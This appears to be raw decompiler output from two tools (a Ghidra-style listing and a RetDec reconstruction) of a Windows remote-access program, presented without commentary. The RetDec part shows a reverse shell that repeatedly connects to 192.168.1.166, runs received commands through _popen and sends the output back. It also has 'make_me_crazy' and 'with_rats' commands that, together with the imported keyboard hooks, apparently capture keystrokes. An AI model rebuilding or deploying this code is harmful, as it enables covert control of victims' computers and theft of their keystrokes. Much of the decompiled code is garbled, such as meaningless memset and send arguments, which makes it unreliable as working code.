return iVar1;
}
char * __cdecl _strcat(char *_Dest,char *_Source)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x004047a0. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = strcat(_Dest,_Source);
return pcVar1;
}
int __cdecl _sprintf(char *_Dest,char *_Format,...)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x004047a8. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = sprintf(_Dest,_Format);
return iVar1;
}
// WARNING: Unknown calling convention -- yet parameter storage is locked
void _signal(int param_1)
{
// WARNING: Could not recover jumptable at 0x004047b0. Too many branches
// WARNING: Treating indirect jump as call
signal(param_1);
return;
}
char * __cdecl _setlocale(int _Category,char *_Locale)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x004047b8. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = setlocale(_Category,_Locale);
return pcVar1;
}
void * __cdecl _realloc(void *_Memory,size_t _NewSize)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x004047c0. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = realloc(_Memory,_NewSize);
return pvVar1;
}
void * __cdecl _memset(void *_Dst,int _Val,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x004047c8. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = memset(_Dst,_Val,_Size);
return pvVar1;
}
void * __cdecl _memcpy(void *_Dst,void *_Src,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x004047d0. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = memcpy(_Dst,_Src,_Size);
return pvVar1;
}
size_t __cdecl _mbstowcs(wchar_t *_Dest,char *_Source,size_t _MaxCount)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x004047d8. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = mbstowcs(_Dest,_Source,_MaxCount);
return sVar1;
}
void * __cdecl _malloc(size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x004047e0. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = malloc(_Size);
return pvVar1;
}
size_t __cdecl _fwrite(void *_Str,size_t _Size,size_t _Count,FILE *_File)
{
size_t sVar1;
// WARNING: Could not recover jumptable at 0x004047e8. Too many branches
// WARNING: Treating indirect jump as call
sVar1 = fwrite(_Str,_Size,_Count,_File);
return sVar1;
}
void __cdecl _free(void *_Memory)
{
// WARNING: Could not recover jumptable at 0x004047f0. Too many branches
// WARNING: Treating indirect jump as call
free(_Memory);
return;
}
char * __cdecl _fgets(char *_Buf,int _MaxCount,FILE *_File)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x004047f8. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = fgets(_Buf,_MaxCount,_File);
return pcVar1;
}
int __cdecl _fclose(FILE *_File)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404800. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = fclose(_File);
return iVar1;
}
void __cdecl _exit(int _Code)
{
// WARNING: Could not recover jumptable at 0x00404808. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
exit(_Code);
return;
}
void * __cdecl _calloc(size_t _Count,size_t _Size)
{
void *pvVar1;
// WARNING: Could not recover jumptable at 0x00404810. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = calloc(_Count,_Size);
return pvVar1;
}
void __cdecl _abort(void)
{
// WARNING: Could not recover jumptable at 0x00404818. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
abort();
return;
}
int __cdecl __setmode(int _FileHandle,int _Mode)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404820. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _setmode(_FileHandle,_Mode);
return iVar1;
}
FILE * __cdecl __popen(char *_Command,char *_Mode)
{
FILE *pFVar1;
// WARNING: Could not recover jumptable at 0x00404828. Too many branches
// WARNING: Treating indirect jump as call
pFVar1 = _popen(_Command,_Mode);
return pFVar1;
}
int __cdecl __isctype(int _C,int _Type)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404830. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _isctype(_C,_Type);
return iVar1;
}
char * __cdecl __fullpath(char *_FullPath,char *_Path,size_t _SizeInBytes)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x00404838. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = _fullpath(_FullPath,_Path,_SizeInBytes);
return pcVar1;
}
int * __cdecl __errno(void)
{
int *piVar1;
// WARNING: Could not recover jumptable at 0x00404840. Too many branches
// WARNING: Treating indirect jump as call
piVar1 = _errno();
return piVar1;
}
void __cdecl __cexit(void)
{
// WARNING: Could not recover jumptable at 0x00404848. Too many branches
// WARNING: Treating indirect jump as call
_cexit();
return;
}
void ___p__fmode(void)
{
// WARNING: Could not recover jumptable at 0x00404850. Too many branches
// WARNING: Treating indirect jump as call
__p__fmode();
return;
}
void ___p__environ(void)
{
// WARNING: Could not recover jumptable at 0x00404858. Too many branches
// WARNING: Treating indirect jump as call
__p__environ();
return;
}
int __cdecl
___getmainargs(int *_Argc,char ***_Argv,char ***_Env,int _DoWildCard,_startupinfo *_StartInfo)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404860. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = __getmainargs(_Argc,_Argv,_Env,_DoWildCard,_StartInfo);
return iVar1;
}
BOOL _UnhookWindowsHookEx_4(HHOOK hhk)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404868. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = UnhookWindowsHookEx(hhk);
return BVar1;
}
BOOL _TranslateMessage_4(MSG *lpMsg)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404870. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = TranslateMessage(lpMsg);
return BVar1;
}
HHOOK _SetWindowsHookExA_16(int idHook,HOOKPROC lpfn,HINSTANCE hmod,DWORD dwThreadId)
{
HHOOK pHVar1;
// WARNING: Could not recover jumptable at 0x00404878. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = SetWindowsHookExA(idHook,lpfn,hmod,dwThreadId);
return pHVar1;
}
BOOL _GetMessageA_16(LPMSG lpMsg,HWND hWnd,UINT wMsgFilterMin,UINT wMsgFilterMax)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404880. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = GetMessageA(lpMsg,hWnd,wMsgFilterMin,wMsgFilterMax);
return BVar1;
}
SHORT _GetAsyncKeyState_4(int vKey)
{
SHORT SVar1;
// WARNING: Could not recover jumptable at 0x00404888. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = GetAsyncKeyState(vKey);
return SVar1;
}
LRESULT _DispatchMessageA_4(MSG *lpMsg)
{
LRESULT LVar1;
// WARNING: Could not recover jumptable at 0x00404890. Too many branches
// WARNING: Treating indirect jump as call
LVar1 = DispatchMessageA(lpMsg);
return LVar1;
}
LRESULT _CallNextHookEx_16(HHOOK hhk,int nCode,WPARAM wParam,LPARAM lParam)
{
LRESULT LVar1;
// WARNING: Could not recover jumptable at 0x00404898. Too many branches
// WARNING: Treating indirect jump as call
LVar1 = CallNextHookEx(hhk,nCode,wParam,lParam);
return LVar1;
}
DWORD _WaitForSingleObject_8(HANDLE hHandle,DWORD dwMilliseconds)
{
DWORD DVar1;
// WARNING: Could not recover jumptable at 0x004048a0. Too many branches
// WARNING: Treating indirect jump as call
DVar1 = WaitForSingleObject(hHandle,dwMilliseconds);
return DVar1;
}
SIZE_T _VirtualQuery_12(LPCVOID lpAddress,PMEMORY_BASIC_INFORMATION lpBuffer,SIZE_T dwLength)
{
SIZE_T SVar1;
// WARNING: Could not recover jumptable at 0x004048a8. Too many branches
// WARNING: Treating indirect jump as call
SVar1 = VirtualQuery(lpAddress,lpBuffer,dwLength);
return SVar1;
}
BOOL _VirtualProtect_16(LPVOID lpAddress,SIZE_T dwSize,DWORD flNewProtect,PDWORD lpflOldProtect)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004048b0. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = VirtualProtect(lpAddress,dwSize,flNewProtect,lpflOldProtect);
return BVar1;
}
LPVOID _TlsGetValue_4(DWORD dwTlsIndex)
{
LPVOID pvVar1;
// WARNING: Could not recover jumptable at 0x004048b8. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = TlsGetValue(dwTlsIndex);
return pvVar1;
}
void _Sleep_4(DWORD dwMilliseconds)
{
// WARNING: Could not recover jumptable at 0x004048c0. Too many branches
// WARNING: Treating indirect jump as call
Sleep(dwMilliseconds);
return;
}
LPTOP_LEVEL_EXCEPTION_FILTER
_SetUnhandledExceptionFilter_4(LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter)
{
LPTOP_LEVEL_EXCEPTION_FILTER pPVar1;
// WARNING: Could not recover jumptable at 0x004048c8. Too many branches
// WARNING: Treating indirect jump as call
pPVar1 = SetUnhandledExceptionFilter(lpTopLevelExceptionFilter);
return pPVar1;
}
BOOL _SetEvent_4(HANDLE hEvent)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004048d0. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = SetEvent(hEvent);
return BVar1;
}
BOOL _ResetEvent_4(HANDLE hEvent)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004048d8. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = ResetEvent(hEvent);
return BVar1;
}
HMODULE _LoadLibraryA_4(LPCSTR lpLibFileName)
{
HMODULE pHVar1;
// WARNING: Could not recover jumptable at 0x004048e0. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = LoadLibraryA(lpLibFileName);
return pHVar1;
}
void _LeaveCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x004048e8. Too many branches
// WARNING: Treating indirect jump as call
LeaveCriticalSection(lpCriticalSection);
return;
}
void _InitializeCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x004048f0. Too many branches
// WARNING: Treating indirect jump as call
InitializeCriticalSection(lpCriticalSection);
return;
}
BOOL _HeapFree_12(HANDLE hHeap,DWORD dwFlags,LPVOID lpMem)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x004048f8. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = HeapFree(hHeap,dwFlags,lpMem);
return BVar1;
}
BOOL _HeapDestroy_4(HANDLE hHeap)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404900. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = HeapDestroy(hHeap);
return BVar1;
}
HANDLE _HeapCreate_12(DWORD flOptions,SIZE_T dwInitialSize,SIZE_T dwMaximumSize)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x00404908. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = HeapCreate(flOptions,dwInitialSize,dwMaximumSize);
return pvVar1;
}
LPVOID _HeapAlloc_12(HANDLE hHeap,DWORD dwFlags,SIZE_T dwBytes)
{
LPVOID pvVar1;
// WARNING: Could not recover jumptable at 0x00404910. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = HeapAlloc(hHeap,dwFlags,dwBytes);
return pvVar1;
}
void _GetStartupInfoA_4(LPSTARTUPINFOA lpStartupInfo)
{
// WARNING: Could not recover jumptable at 0x00404918. Too many branches
// WARNING: Treating indirect jump as call
GetStartupInfoA(lpStartupInfo);
return;
}
FARPROC _GetProcAddress_8(HMODULE hModule,LPCSTR lpProcName)
{
FARPROC pFVar1;
// WARNING: Could not recover jumptable at 0x00404920. Too many branches
// WARNING: Treating indirect jump as call
pFVar1 = GetProcAddress(hModule,lpProcName);
return pFVar1;
}
HMODULE _GetModuleHandleA_4(LPCSTR lpModuleName)
{
HMODULE pHVar1;
// WARNING: Could not recover jumptable at 0x00404928. Too many branches
// WARNING: Treating indirect jump as call
pHVar1 = GetModuleHandleA(lpModuleName);
return pHVar1;
}
DWORD _GetLastError_0(void)
{
DWORD DVar1;
// WARNING: Could not recover jumptable at 0x00404930. Too many branches
// WARNING: Treating indirect jump as call
DVar1 = GetLastError();
return DVar1;
}
LPSTR _GetCommandLineA_0(void)
{
LPSTR pCVar1;
// WARNING: Could not recover jumptable at 0x00404938. Too many branches
// WARNING: Treating indirect jump as call
pCVar1 = GetCommandLineA();
return pCVar1;
}
BOOL _FreeLibrary_4(HMODULE hLibModule)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404940. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FreeLibrary(hLibModule);
return BVar1;
}
BOOL _FindNextFileA_8(HANDLE hFindFile,LPWIN32_FIND_DATAA lpFindFileData)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404948. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FindNextFileA(hFindFile,lpFindFileData);
return BVar1;
}
HANDLE _FindFirstFileA_8(LPCSTR lpFileName,LPWIN32_FIND_DATAA lpFindFileData)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x00404950. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = FindFirstFileA(lpFileName,lpFindFileData);
return pvVar1;
}
BOOL _FindClose_4(HANDLE hFindFile)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404958. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = FindClose(hFindFile);
return BVar1;
}
void _ExitProcess_4(UINT uExitCode)
{
// WARNING: Could not recover jumptable at 0x00404960. Too many branches
// WARNING: Subroutine does not return
// WARNING: Treating indirect jump as call
ExitProcess(uExitCode);
return;
}
void _EnterCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x00404968. Too many branches
// WARNING: Treating indirect jump as call
EnterCriticalSection(lpCriticalSection);
return;
}
void _DeleteCriticalSection_4(LPCRITICAL_SECTION lpCriticalSection)
{
// WARNING: Could not recover jumptable at 0x00404970. Too many branches
// WARNING: Treating indirect jump as call
DeleteCriticalSection(lpCriticalSection);
return;
}
HANDLE _CreateThread_24(LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,
LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,
DWORD dwCreationFlags,LPDWORD lpThreadId)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x00404978. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = CreateThread(lpThreadAttributes,dwStackSize,lpStartAddress,lpParameter,dwCreationFlags,
lpThreadId);
return pvVar1;
}
HANDLE _CreateMutexA_12(LPSECURITY_ATTRIBUTES lpMutexAttributes,BOOL bInitialOwner,LPCSTR lpName)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x00404980. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = CreateMutexA(lpMutexAttributes,bInitialOwner,lpName);
return pvVar1;
}
HANDLE _CreateEventA_16(LPSECURITY_ATTRIBUTES lpEventAttributes,BOOL bManualReset,BOOL bInitialState
,LPCSTR lpName)
{
HANDLE pvVar1;
// WARNING: Could not recover jumptable at 0x00404988. Too many branches
// WARNING: Treating indirect jump as call
pvVar1 = CreateEventA(lpEventAttributes,bManualReset,bInitialState,lpName);
return pvVar1;
}
BOOL _CloseHandle_4(HANDLE hObject)
{
BOOL BVar1;
// WARNING: Could not recover jumptable at 0x00404990. Too many branches
// WARNING: Treating indirect jump as call
BVar1 = CloseHandle(hObject);
return BVar1;
}
int __cdecl _stricoll(char *_Str1,char *_Str2)
{
int iVar1;
// WARNING: Could not recover jumptable at 0x00404998. Too many branches
// WARNING: Treating indirect jump as call
iVar1 = _stricoll(_Str1,_Str2);
return iVar1;
}
char * __cdecl _strdup(char *_Src)
{
char *pcVar1;
// WARNING: Could not recover jumptable at 0x004049a0. Too many branches
// WARNING: Treating indirect jump as call
pcVar1 = _strdup(_Src);
return pcVar1;
}
int __cdecl _text_startup(int _Argc,char **_Argv,char **_Env)
{
byte bVar1;
byte *pbVar2;
int iVar3;
byte *pbVar4;
_STARTUPINFOA local_64;
int *local_14;
local_14 = &_Argc;
___main();
pbVar2 = (byte *)_GetCommandLineA_0();
_GetStartupInfoA_4(&local_64);
if (pbVar2 != (byte *)0x0) {
for (; (bVar1 = *pbVar2, bVar1 == 0x20 || (bVar1 == 9)); pbVar2 = pbVar2 + 1) {
}
if (bVar1 == 0x22) {
do {
pbVar4 = pbVar2;
pbVar2 = pbVar4 + 1;
bVar1 = *pbVar2;
if (bVar1 == 0x22) break;
} while (bVar1 != 0);
if (bVar1 == 0x22) {
pbVar2 = pbVar4 + 2;
}
}
else {
for (; ((*pbVar2 & 0xdf) != 0 && (*pbVar2 != 9)); pbVar2 = pbVar2 + 1) {
}
}
for (; (*pbVar2 == 0x20 || (*pbVar2 == 9)); pbVar2 = pbVar2 + 1) {
}
}
_GetModuleHandleA_4((LPCSTR)0x0);
iVar3 = _WinMain_16();
return iVar3;
}","//
// This file was generated by the Retargetable Decompiler
// Website: https://retdec.com/
//
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <windows.h>
// ------------------------ Structures ------------------------
struct WSAData {
int16_t e0;
int16_t e1;
int16_t e2;
int16_t e3;
char * e4;
char e5[1];
char e6[1];
};
struct _IO_FILE {
int32_t e0;
};
struct _STARTUPINFOA {
int32_t e0;
char * e1;
char * e2;
char * e3;
int32_t e4;
int32_t e5;
int32_t e6;
int32_t e7;
int32_t e8;
int32_t e9;
int32_t e10;
int32_t e11;
int16_t e12;
int16_t e13;
char * e14;
int32_t * e15;
int32_t * e16;
int32_t * e17;
};
struct sockaddr {
int16_t e0;
char e1[14];
};
// ------------------- Function Prototypes --------------------
int32_t ___chkstk_ms(void);
int32_t ___do_global_ctors(void);
int32_t ___main(void);
int32_t _make_me_crazy(void);
int32_t _oh_boy_what_does_this_do(void);
int32_t _real_main(int32_t a1);
int32_t _WinMain_40_16(int32_t a1, int32_t a2, int32_t a3, int32_t a4);
// --------------------- Global Variables ---------------------
int32_t g1 = -1; // 0x404a90
int32_t g2 = 0x39310072; // 0x406085
int32_t g3 = 0; // 0x408024
int32_t g4 = 0; // 0x408028
char * g5; // 0x40802c
int32_t g6 = 0; // 0x408030
char * g7; // 0x408038
int32_t g8 = 0; // 0x40803c
char * g9; // 0x408040
char * g10; // 0x408044
int32_t g11 = 0; // 0x408048
int32_t g12 = 0; // 0x408054
int32_t g13 = 0; // 0x40809c
int32_t g14;
// ------- Dynamically Linked Functions Without Header --------
int32_t _chdir(char * a1);
struct _IO_FILE * _popen(char * a1, char * a2);
// ------------------------ Functions -------------------------
// Address range: 0x401460 - 0x401828
int32_t _oh_boy_what_does_this_do(void) {
int32_t v1 = ___chkstk_ms(); // 0x401468
int32_t v2; // bp-1040, 0x401460
int32_t v3 = &v2; // 0x401485
int32_t v4; // bp-2064, 0x401460
int32_t v5 = &v4;
char * sock; // bp-20448, 0x401460
int32_t v6 = (int32_t)&sock;
int32_t v7; // bp-4, 0x401460
int32_t v8 = (int32_t)&v7 - v1;
int32_t * v9 = (int32_t *)(v8 + 8); // 0x40146f
*v9 = 1024;
int32_t * v10 = (int32_t *)(v8 + 4); // 0x401477
*v10 = 0;
int32_t * v11 = (int32_t *)v8; // 0x401485
*v11 = v3;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*v9 = 1024;
*v10 = 0;
*v11 = v5;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*v9 = 0x47d0;
*v10 = 0;
*v11 = v6;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*(int32_t *)(v8 + 12) = 0;
*v9 = 1024;
*v10 = v3;
*v11 = g13;
recv((int32_t)&g14, (char *)&g14, (int32_t)&g14, (int32_t)&g14);
int32_t * v12 = (int32_t *)(v8 - 8); // 0x4014f5
*v12 = 4;
int32_t * v13 = (int32_t *)(v8 - 12); // 0x401503
*v13 = v3;
int32_t * v14 = (int32_t *)(v8 - 16);
*v14 = (int32_t)""quit"";
while (strncmp((char *)&g14, (char *)&g14, (int32_t)&g14) != 0) {
// 0x401538
*v12 = 3;
*v13 = v3;
*v14 = (int32_t)""cd "";
int32_t v15; // 0x401460
if (strncmp((char *)&g14, (char *)&g14, (int32_t)&g14) != 0) {
// 0x40159c
*v12 = 12;
*v13 = v3;
*v14 = (int32_t)""make_me_crazy"";
if (strncmp((char *)&g14, (char *)&g14, (int32_t)&g14) != 0) {
// 0x401623
*v12 = 9;
*v13 = v3;
*v14 = (int32_t)""with_rats"";
if (strncmp((char *)&g14, (char *)&g14, (int32_t)&g14) != 0) {
// 0x401798
*v13 = (int32_t)&g2;
*v14 = v3;
int32_t v16 = (int32_t)_popen((char *)&g14, (char *)&g14); // 0x4017a9
*v12 = v16;
*v13 = 1024;
*v14 = v5;
if (fgets((char *)&g14, (int32_t)&g14, (struct _IO_FILE *)&g14) != NULL) {
*v13 = v5;
*v14 = v6;
strcat((char *)&g14, (char *)&g14);
*v12 = v16;
*v13 = 1024;
*v14 = v5;
while (fgets((char *)&g14, (int32_t)&g14, (struct _IO_FILE *)&g14) != NULL) {
// 0x4017b3
*v13 = v5;
*v14 = v6;
strcat((char *)&g14, (char *)&g14);
*v12 = v16;
*v13 = 1024;
*v14 = v5;
}
}
// 0x4017ec
*(int32_t *)(v8 - 4) = 0;
*v12 = 0x47d0;
*v13 = v6;
*v14 = g13;
send((int32_t)&g14, (char *)&g14, (int32_t)&g14, (int32_t)&g14);
int32_t v17 = v8 - 32; // 0x401815
*(int32_t *)v17 = v16;
fclose((struct _IO_FILE *)&g14);
v15 = v17;
} else {
// 0x401649
*v14 = (int32_t)g10;
ResetEvent(&g14);
int32_t v18 = v8 - 20; // 0x401656
int32_t * v19; // 0x401460
int32_t v20; // 0x401460
if (g11 == 0) {
// 0x401737
sock = (char *)0x204f4e5b;
*v12 = 0;
*v13 = 0x47d0;
*v14 = v6;
*(int32_t *)v18 = g13;
send((int32_t)sock, (char *)0x454e, 0x41544144, MSG_OOB | MSG_DONTROUTE | MSG_CTRUNC | MSG_PROXY | MSG_DONTWAIT | MSG_FIN | MSG_CONFIRM);
int32_t v21 = v8 - 36; // 0x401780
v19 = (int32_t *)v21;
v20 = v21;
} else {
// 0x401666
*v14 = -1;
int32_t * v22 = (int32_t *)v18; // 0x401673
*v22 = (int32_t)g9;
WaitForSingleObject(&g14, (int32_t)&g14);
sock = (char *)0x3a474c4b;
int32_t * v23 = (int32_t *)(v8 - 28); // 0x401693
*v23 = g8;
*v22 = strlen(sock);
int32_t * v24 = (int32_t *)(v8 - 24); // 0x4016b0
*v24 = g8;
int32_t v25; // bp-20443, 0x401460
*v23 = (int32_t)&v25;
strncpy((char *)&g14, (char *)&g14, (int32_t)&g14);
*v23 = g8;
*(char *)(v6 + 5 + strlen((char *)&g14)) = 10;
*v14 = 0;
*v22 = 0x47d0;
*v24 = v6;
*v23 = g13;
send((int32_t)&g14, (char *)&g14, (int32_t)&g14, (int32_t)&g14);
int32_t v26 = v8 - 44; // 0x401700
int32_t * v27 = (int32_t *)v26;
*v27 = g8;
*(int32_t *)(v8 - 36) = strlen((char *)&g14);
*(int32_t *)(v8 - 40) = 0;
*v27 = g8;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
g11 = 0;
v19 = v27;
v20 = v26;
}
// 0x401783
*v19 = (int32_t)g10;
SetEvent(&g14);
v15 = v20 - 4;
}
} else {
int32_t v28 = _make_me_crazy(); // 0x4015be
char * buf = v28 == 0 ? (char *)0x7365 : (char *)0x6465;
sock = v28 == 0 ? (char *)0x63637553 : (char *)0x6c696146;
*(int32_t *)(v8 - 4) = 0;
*v12 = 0x47d0;
*v13 = v6;
*v14 = g13;
send((int32_t)sock, buf, (int32_t)&g14, (int32_t)&g14);
v15 = v8 - 32;
}
} else {
// 0x40155a
int32_t v29; // bp-1037, 0x401460
*v14 = (int32_t)&v29;
_chdir((char *)&g14);
*(int32_t *)(v8 - 4) = 0;
*v12 = 0x47d0;
*v13 = v6;
*v14 = g13;
send((int32_t)&g14, (char *)&g14, (int32_t)&g14, (int32_t)&g14);
v15 = v8 - 32;
}
v8 = v15;
v9 = (int32_t *)(v8 + 8);
*v9 = 1024;
v10 = (int32_t *)(v8 + 4);
*v10 = 0;
v11 = (int32_t *)v8;
*v11 = v3;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*v9 = 1024;
*v10 = 0;
*v11 = v5;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*v9 = 0x47d0;
*v10 = 0;
*v11 = v6;
memset(&g14, (int32_t)&g14, (int32_t)&g14);
*(int32_t *)(v8 + 12) = 0;
*v9 = 1024;
*v10 = v3;
*v11 = g13;
recv((int32_t)&g14, (char *)&g14, (int32_t)&g14, (int32_t)&g14);
v12 = (int32_t *)(v8 - 8);
*v12 = 4;
v13 = (int32_t *)(v8 - 12);
*v13 = v3;
v14 = (int32_t *)(v8 - 16);
*v14 = (int32_t)""quit"";
}
// 0x401517
*v14 = g13;
closesocket((int32_t)&g14);
WSACleanup();
*(int32_t *)(v8 - 20) = 0;
exit((int32_t)&g14);
// UNREACHABLE
}
// Address range: 0x401828 - 0x40190c
int32_t _real_main(int32_t a1) {
int32_t v1 = 0; // bp-36, 0x401831
int32_t v2; // bp-436, 0x401828
if (WSAStartup(2, (struct WSAData *)&v2) != 0) {
// 0x401877
exit(1);
// UNREACHABLE
}
// 0x401883
g13 = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
v1 = 2;
inet_addr(""192.168.1.166"");
htons(-0x3cab);
int32_t v3; // bp-488, 0x401828
int32_t v4 = &v3; // 0x4018ca
*(int32_t *)(v4 + 8) = 16;
int32_t v5 = &v1; // 0x4018f4
*(int32_t *)(v4 + 4) = v5;
v3 = g13;
if (connect((int32_t)&g14, (struct sockaddr *)&g14, (int32_t)&g14) == 0) {
// 0x401907
_oh_boy_what_does_this_do();
// UNREACHABLE
}
int32_t * v6 = (int32_t *)(v4 - 12);
*v6 = 10;
Sleep((int32_t)&g14);
int32_t v7 = v4 - 16; // 0x4018df
*(int32_t *)(v4 - 8) = 16;
*v6 = v5;
*(int32_t *)v7 = g13;
while (connect((int32_t)&g14, (struct sockaddr *)&g14, (int32_t)&g14) != 0) {
int32_t v8 = v7;
v6 = (int32_t *)(v8 - 12);
*v6 = 10;
Sleep((int32_t)&g14);
v7 = v8 - 16;
*(int32_t *)(v8 - 8) = 16;
*v6 = v5;
*(int32_t )v7 = g13;
}
// 0x401907
_oh_boy_what_does_this_do();
// UNREACHABLE
}
// Address range: 0x40190f - 0x40191f
int32_t _WinMain_40_16(int32_t a1, int32_t a2, int32_t a3, int32_t a4) {
// 0x40190f
int32_t v1; // 0x40190f
return _real_main(v1);
}
// Address range: 0x401920 - 0x401aa7
int32_t _make_me_crazy(void) {
int32_t * v1 = CreateMutexA(NULL, true, ""make_me_crazy""); // 0x40193d
g3 = (int32_t)v1;
int32_t result = -1; // 0x401951
if (v1 != NULL) {
// 0x40195d
atexit((void ()())0x4020b3);
int32_t * hHeap = HeapCreate(0, 1025, 0); // 0x401980
g4 = (int32_t)hHeap;
g5 = (char *)HeapAlloc(hHeap, 8, 1025);
g6 = 1025;
int32_t * hHeap2 = HeapCreate(0, 1025, 0); // 0x4019d4
g7 = (char *)hHeap2;
g8 = (int32_t)HeapAlloc(hHeap2, 8, 0x47ca);
g10 = (char )CreateEventA(NULL, true, true, NULL);
g9 = (char )CreateEventA(NULL, true, true, NULL);
result = CreateThread(NULL, 0, (int32_t ()(int32_t ))0x401f64, NULL, 0, NULL) == NULL;
}
// 0x401aa5
return result;
}
// Address range: 0x4026a0 - 0x4026e6
int32_t ___do_global_ctors(void) {
int32_t v1 = 0;
int32_t v2 = v1 + 1; // 0x4026d6
while ((int32_t )(4 * v2 + (int32_t)&g1) != 0) {
// 0x4026d6
v1 = v2;
v2 = v1 + 1;
}
// 0x4026e4
if (v1 == 0) {
// 0x4026bf
return atexit((void ()())0x402670);
}
int32_t v3 = v1; // 0x4026b1
while (v3 != 1) {
// 0x4026b3
v3--;
}
// 0x4026bf
return atexit((void ()())0x402670);
}
// Address range: 0x4026f0 - 0x40270c
int32_t ___main(void) {
int32_t result = g12; // 0x4026f0
if (result != 0) {
// 0x4026f9
return result;
}
// 0x402700
g12 = 1;
return ___do_global_ctors();
}
// Address range: 0x402d40 - 0x402d6a
int32_t ___chkstk_ms(void) {
// 0x402d40
int32_t result; // 0x402d40
return result;
}
// Address range: 0x4049b0 - 0x404a7b
int main(int argc, char ** argv) {
// 0x4049b0
___main();
char * commandLine = GetCommandLineA(); // 0x4049c8
int32_t v1 = (int32_t)commandLine; // 0x4049c8
int32_t lpStartupInfo; // bp-100, 0x4049b0
GetStartupInfoA((struct _STARTUPINFOA *)&lpStartupInfo);
int32_t v2 = v1; // 0x4049df
int32_t v3 = v1; // 0x4049df
int32_t v4; // 0x4049b0
int32_t * moduleHandle; // 0x404a34
if (commandLine == NULL) {
lab_0x404a1e:;
// 0x404a1e
int16_t v5; // 0x4049b0
char v6; // 0x4049b0
v4 = v6 % 2 == 0 ? 10 : (int32_t)(uint16_t)v5;
moduleHandle = GetModuleHandleA(NULL);
return _WinMain_40_16((int32_t)moduleHandle, 0, v3, v4);
}
int32_t v7; // 0x4049b0
char v8; // 0x4049e6
while (true) {
lab_0x4049e6:
// 0x4049e6
v7 = v2;
v8 = *(char *)v7;
switch (v8) {
case 32: {
// 0x4049e3
